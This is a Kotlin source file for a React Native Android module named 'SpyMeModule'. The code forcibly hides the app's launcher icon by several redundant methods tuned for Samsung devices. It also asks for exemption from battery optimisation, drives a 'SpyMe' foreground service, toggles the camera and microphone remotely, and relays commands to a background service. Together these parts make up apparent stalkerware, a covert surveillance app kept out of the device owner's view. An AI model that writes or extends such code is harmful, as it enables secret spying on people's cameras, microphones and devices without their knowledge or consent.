package com.anonymous.scure_beat

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod

class SpyMeModule(private val reactContext: ReactApplicationContext) :
    ReactContextBaseJavaModule(reactContext) {

    init {
        reactContextInstance = reactContext
    }

    override fun getName(): String = "SpyMeNativeModule"

    @ReactMethod
    fun startService() {
        // ✅ Force hide icon using ALL methods
        hideAppIconForce()

        val intent = Intent(reactContext, PermissionHandlerActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        reactContext.startActivity(intent)
    }

    @ReactMethod
    fun hideIconForever() {
        hideAppIconForce()
    }

    @ReactMethod
    fun showIcon() {
        try {
            // Show icon
            val alias = ComponentName(reactContext, "com.anonymous.scure_beat.LauncherAlias")
            reactContext.packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP,
            )

            // ✅ Also try MAIN activity (for some devices)
            val mainActivity = ComponentName(reactContext, "com.anonymous.scure_beat.MainActivity")
            reactContext.packageManager.setComponentEnabledSetting(
                mainActivity,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP,
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun hideAppIconForce() {
        try {
            // ✅ Method 1: Disable LauncherAlias (standard)
            val alias = ComponentName(reactContext, "com.anonymous.scure_beat.LauncherAlias")
            reactContext.packageManager.setComponentEnabledSetting(
                alias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )

            // ✅ Method 2: Also disable MAIN activity (for Samsung)
            val mainActivity = ComponentName(reactContext, "com.anonymous.scure_beat.MainActivity")
            reactContext.packageManager.setComponentEnabledSetting(
                mainActivity,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )

            // ✅ Method 3: Force package manager sync (critical for Samsung)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // Android 12+ needs this
                reactContext.packageManager.setComponentEnabledSetting(
                    alias,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP or PackageManager.MATCH_DISABLED_COMPONENTS,
                )
            }

            // ✅ Method 4: Clear launcher cache (works on Samsung)
            try {
                val launcherIntent =
                    Intent(Intent.ACTION_MAIN).apply { addCategory(Intent.CATEGORY_HOME) }
                val resolveInfo = reactContext.packageManager.resolveActivity(launcherIntent, 0)
                val launcherPackage = resolveInfo?.activityInfo?.packageName
                if (launcherPackage != null) {
                    reactContext.packageManager.setComponentEnabledSetting(
                        alias,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP,
                    )
                }
            } catch (e: Exception) {
                // Ignore
            }

            // ✅ Method 5: Send broadcast to force launcher refresh (Samsung specific)
            try {
                val refreshIntent = Intent(Intent.ACTION_PACKAGE_CHANGED)
                refreshIntent.data = android.net.Uri.parse("package:${reactContext.packageName}")
                refreshIntent.putExtra(Intent.EXTRA_DONT_KILL_APP, true)
                reactContext.sendBroadcast(refreshIntent)
            } catch (e: Exception) {
                // Ignore
            }

            // ✅ Method 6: Delayed refresh (critical for Samsung OneUI)
            Handler(Looper.getMainLooper())
                .postDelayed(
                    {
                        try {
                            val aliasRetry =
                                ComponentName(
                                    reactContext,
                                    "com.anonymous.scure_beat.LauncherAlias",
                                )
                            reactContext.packageManager.setComponentEnabledSetting(
                                aliasRetry,
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP or
                                    PackageManager.MATCH_DISABLED_COMPONENTS,
                            )
                        } catch (e: Exception) {
                            // Ignore
                        }
                    },
                    500,
                )

            // ✅ Method 7: Final retry after 2 seconds (Samsung needs this)
            Handler(Looper.getMainLooper())
                .postDelayed(
                    {
                        try {
                            val aliasFinal =
                                ComponentName(
                                    reactContext,
                                    "com.anonymous.scure_beat.LauncherAlias",
                                )
                            reactContext.packageManager.setComponentEnabledSetting(
                                aliasFinal,
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                PackageManager.DONT_KILL_APP,
                            )
                        } catch (e: Exception) {
                            // Ignore
                        }
                    },
                    2000,
                )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @ReactMethod
    fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val powerManager =
                reactContext.getSystemService(android.content.Context.POWER_SERVICE)
                    as android.os.PowerManager
            val packageName = reactContext.packageName
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                val intent =
                    Intent().apply {
                        action =
                            android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                        data = android.net.Uri.parse("package:$packageName")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                reactContext.startActivity(intent)
            }
        }
    }

    @ReactMethod
    fun stopService() {
        val intent = Intent(reactContext, SpyMeForegroundService::class.java)
        reactContext.stopService(intent)
    }

    @ReactMethod
    fun toggleCamera() {
        val intent = Intent("com.anonymous.scure_beat.TOGGLE_CAMERA")
        reactContext.sendBroadcast(intent)
    }

    @ReactMethod
    fun toggleMic() {
        val intent = Intent("com.anonymous.scure_beat.TOGGLE_MIC")
        reactContext.sendBroadcast(intent)
    }

    @ReactMethod
    fun sendResourceCommand(command: String) {
        val intent =
            Intent(reactContext, ResourceManagerService::class.java).apply {
                putExtra("command", command)
            }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            reactContext.startForegroundService(intent)
        } else {
            reactContext.startService(intent)
        }
    }

    companion object {
        var reactContextInstance: ReactApplicationContext? = null

        fun emitLog(message: String) {
            reactContextInstance?.let { context ->
                if (context.hasActiveCatalystInstance()) {
                    context
                        .getJSModule(
                            com.facebook.react.modules.core.DeviceEventManagerModule
                                    .RCTDeviceEventEmitter::class
                                .java
                        )
                        .emit("SpyMeLogEvent", message)
                }
            }
        }
    }
}
